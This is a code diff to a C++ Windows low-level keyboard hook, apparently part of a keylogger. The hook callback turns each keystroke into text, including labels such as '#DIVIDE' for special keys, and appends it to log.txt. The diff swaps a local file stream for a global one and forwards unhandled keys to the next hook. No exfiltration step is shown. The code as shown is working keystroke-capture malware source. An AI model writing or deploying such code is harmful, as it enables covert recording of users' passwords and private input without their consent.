@@ -2,6 +2,8 @@
 #include <fstream>
 #include <string>
 
+std::ofstream f;
+
 LRESULT CALLBACK proc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
@@ -100,13 +102,12 @@ LRESULT CALLBACK proc(int nCode, WPARAM wParam, LPARAM lParam)
                     tmp = "#DIVIDE";
                     break;
                 default:
-                    ;
+                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                 }
             }
-            std::ofstream log;
-            log.open("log.txt", std::ofstream::app);
-            log << tmp << "\n";
-            log.close();
+            f.open("log.txt", std::ofstream::app);
+            f << tmp << "\n";
+            f.close();
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
